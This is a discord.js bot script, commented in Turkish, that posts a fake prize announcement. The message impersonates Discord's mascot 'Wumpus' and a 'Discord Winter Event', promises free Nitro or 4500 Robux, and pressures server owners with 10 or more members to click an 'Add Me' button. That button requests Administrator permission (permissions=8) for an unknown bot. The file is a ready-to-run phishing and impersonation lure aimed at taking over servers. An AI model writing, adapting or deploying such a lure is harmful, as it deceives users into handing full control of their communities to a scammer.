const { Client, Intents, MessageEmbed, MessageActionRow, MessageButton } = require('discord.js');
const client = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.MESSAGE_CONTENT,
        Intents.FLAGS.GUILD_MEMBERS,
    ],
});

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content === '!embed') {
        // Embed mesajını oluşturuyoruz
        const embed = new MessageEmbed()
            .setTitle('🎉  | Redeem your 1 month of Discord Nitro! / 4500 Robux')
            .setDescription('📌   | Hey there! I\'m **Wumpus**, a Discord Bot gifting awesome free prizes such as **Discord Nitro subscription** or **4500 Robux** for adding me to your server!\n\n> 🎁 | To be able to receive your prize, you must follow the requirements below!\n\n> `1.` Click **Add me** to your server\n> `2.` Server must have at least `10+ members` & **have an activity**\n> `3.` After finished your **gift link** will be sent via **DMs** shortly!')
            .setColor('5b5bff')
            .setFooter("© Discord Winter Event")
            .setThumbnail("https://cdn.discordapp.com/attachments/1347149052009123865/1347244192786681917/1268867386576994347.gif?ex=67cb1e6e&is=67c9ccee&hm=26fafcdc9e5de1f0849a4cbdf515698caca31135c9d4308b17ba2247a25f4d66&")
            .setImage("https://cdn.discordapp.com/attachments/1571253352992481341/1573300171758899322/IMG_0502.jpg?ex=6b018177&is=6b002ff7&hm=1d0834635edc2a3a93a77dee826bf4f266f6a3fb2c73ec0241957defdff51cda&");

        // Buton oluşturuyoruz
        const button = new MessageButton()
            .setLabel('Add Me')
	    .setEmoji('1364075075598417952')
            .setStyle('LINK')
            .setURL('https://discord.com/oauth2/authorize?client_id=1381640998211424337&permissions=8&integration_type=0&scope=bot');

        // Butonu içeren bir satır (row) oluşturuyoruz
        const row = new MessageActionRow().addComponents(button);

        try {
            // Embed ve butonları kanala gönderiyoruz
            await message.channel.send({
                content: `**You won 1 month Discord nitro!**`,
                embeds: [embed],
                components: [row],
            });
            console.log('Embed with button sent!');
        } catch (error) {
            console.error('Error sending embed with button:', error);
            message.reply('There was an error sending the embed with the button.');
        }
    }
});


client.login(process.env.token);  // Buraya botunuzun token'ını girin
